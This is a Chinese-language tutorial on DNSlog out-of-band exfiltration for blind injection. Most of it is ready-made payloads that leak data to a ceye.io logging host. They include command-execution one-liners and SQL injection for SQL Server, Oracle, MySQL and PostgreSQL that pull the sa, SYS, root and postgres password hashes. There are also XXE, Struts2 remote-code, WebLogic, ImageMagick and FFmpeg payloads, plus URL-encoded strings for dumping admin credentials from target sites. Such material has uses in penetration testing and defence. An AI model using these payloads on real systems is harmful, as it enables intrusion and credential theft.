## 1、原理

DNS在解析的时候会留下日志，利用这个属性，可以读取多级域名的解析日志，来获取信息。

将带有查询的语句 发起dns查询请求，通过dns请求查询到值，组合成三级域名，在ns服务器dns的日志中显示出来。

无回显注入 ，一般使用布尔型盲注入和延时注入 查询数据，但是这两种查询都是很慢，dnslog查询直接显示数据，所以这种注入 效率上面说的这种都要好太多。 

最长的字符好似67个

##  2、平台

http://ceye.io 免费的dnslog平台 里面含有不少的payload 目前还是免费的 ，请大家多注册几个帐号，将来估计要收费的。

### **0x00 Command Execution**

#### i. *nix

curl http://ip.port.b182oj.ceye.io/`whoami`

ping `whoami`.ip.port.b182oj.ceye.io

#### ii. windows

ping %USERNAME%.b182oj.ceye.io

### 0x01 SQL Injection

#### i. SQL Server

DECLARE @host varchar(1024);

SELECT @host=(SELECT TOP 1

master.dbo.fn_varbintohexstr(password_hash)

FROM sys.sql_logins WHERE name='sa')

+'.ip.port.b182oj.ceye.io';

EXEC('master..xp_dirtree

"\\'+@host+'\foobar$"');

#### ii. Oracle

SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.b182oj.ceye.io');

SELECT UTL_HTTP.REQUEST('http://ip.port.b182oj.ceye.io/oracle') FROM DUAL;

SELECT HTTPURITYPE('http://ip.port.b182oj.ceye.io/oracle').GETCLOB() FROM DUAL;

SELECT DBMS_LDAP.INIT(('oracle.ip.port.b182oj.ceye.io',80) FROM DUAL;

SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.b182oj.ceye.io',80) FROM DUAL;

#### iii. MySQL

SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));

#### iv. PostgreSQL

DROP TABLE IF EXISTS table_output;

CREATE TABLE table_output(content text);

CREATE OR REPLACE FUNCTION temp_function()

RETURNS VOID AS $

DECLARE exec_cmd TEXT;

DECLARE query_result TEXT;

BEGIN

SELECT INTO query_result (SELECT passwd

FROM pg_shadow WHERE usename='postgres');

exec_cmd := E'COPY table_output(content)

FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';

EXECUTE exec_cmd;

END;

$ LANGUAGE plpgsql SECURITY DEFINER;

SELECT temp_function();

### 0x02 XML Entity Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test">
%remote;]>
<root/>
```

### 0x03 Others

#### i. Struts2

xx.action?redirect:http://ip.port.b182oj.ceye.io/%25{3*4}

xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://ip.port.b182oj.ceye.io/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}

#### ii. FFMpeg

\#EXTM3U

\#EXT-X-MEDIA-SEQUENCE:0

\#EXTINF:10.0,

concat:http://ip.port.b182oj.ceye.io

\#EXT-X-ENDLIST

#### iii. Weblogic

 xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search

#### iv. ImageMagick

push graphic-context

viewbox 0 0 640 480

fill 'url(http://ip.port.b182oj.ceye.io)'

pop graphic-context

#### v. Resin

xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf

#### vi. Discuz

http://xxx.xxxx.com/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&formhash=xxoo

## 3、实战利用

####  实战mysql

查询库当前库

```sql
SELECT * FROM users WHERE id='1' and if((select load_file(concat('\\\\',(select database()),'.fooe50.ceye.io\\abc'))),1,0)
```

查询数据版本

```sql
SELECT * FROM users WHERE id='1' and if((select load_file(concat('\\\\',(select VERSION()),'.fooe50.ceye.io\\abc'))),1,0)
```

查询admin表的帐号和密码

```http
http://target_sys.com/article.php?id=1 and if((select load_file(concat('\\\\',(select password from admin ),'.fooe50.ceye.io\\abc'))),1,0)
http://target_sys.com/article.php?id=1 and if((select load_file(concat('\\\\',(select username from admin ),'.fooe50.ceye.io\\abc'))),1,0)
```

load_file 使用这个函数 必须 在mysql开启  secure_file_prv= 设置可以读取方可使用这个函数

#### 实战sqlserver

DECLARE @host varchar(1024);

SELECT @host=(SELECT TOP 1

master.dbo.fn_varbintohexstr(password_hash)

FROM sys.sql_logins WHERE name='sa')

+'.ip.port.b182oj.ceye.io';

EXEC('master..xp_dirtree

"\\'+@host+'\foobar$"');

查询sa 密文

```bash
;DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_logins WHERE name='sa')+'.ip.port.fooe50.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');
```

转码

```
%3b%44%45%43%4c%41%52%45%20%40%68%6f%73%74%20%76%61%72%63%68%61%72%28%31%30%32%34%29%3b%53%45%4c%45%43%54%20%40%68%6f%73%74%3d%28%53%45%4c%45%43%54%20%54%4f%50%20%31%20%6d%61%73%74%65%72%2e%64%62%6f%2e%66%6e%5f%76%61%72%62%69%6e%74%6f%68%65%78%73%74%72%28%70%61%73%73%77%6f%72%64%5f%68%61%73%68%29%46%52%4f%4d%20%73%79%73%2e%73%71%6c%5f%6c%6f%67%69%6e%73%20%57%48%45%52%45%20%6e%61%6d%65%3d%27%73%61%27%29%2b%27%2e%69%70%2e%70%6f%72%74%2e%66%6f%6f%65%35%30%2e%63%65%79%65%2e%69%6f%27%3b%45%58%45%43%28%27%6d%61%73%74%65%72%2e%2e%78%70%5f%64%69%72%74%72%65%65%20%22%5c%5c%27%2b%40%68%6f%73%74%2b%27%5c%66%6f%6f%62%61%72%24%22%27%29%3b
```

 

```
http://www.demo1.com/index.aspx?id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 password from admin)+'.ip.port.fooe50.ceye.io';EXEC('master..xp_dirtree"\\'+@host+'\foobar$"');
```

 

```
http://www.demo1.com/index.aspx?id=1%3bDECLARE%20%40host%20varchar(1024)%3bSELECT%20%40host%3d(SELECT%20TOP%201%20password%20from%20admin)%2b%27.ip.port.fooe50.ceye.io%27%3bEXEC(%27master..xp_dirtree%22\\%27%2b%40host%2b%27\foobar%24%22%27)%3b
```



```
http://www.demo1.com/index.aspx?id=1%3bDECLARE %40host varchar(1024)%3bSELECT %40host%3d(SELECT TOP 1 password from admin)%2b'.ip.port.fooe50.ceye.io'%3bEXEC('master..xp_dirtree"\\'%2b%40host%2b'\foobar%24"')%3b
```

 

![img](file:///C:\Users\wzxmt\AppData\Local\Temp\ksohtml26264\wps1.jpg) 

 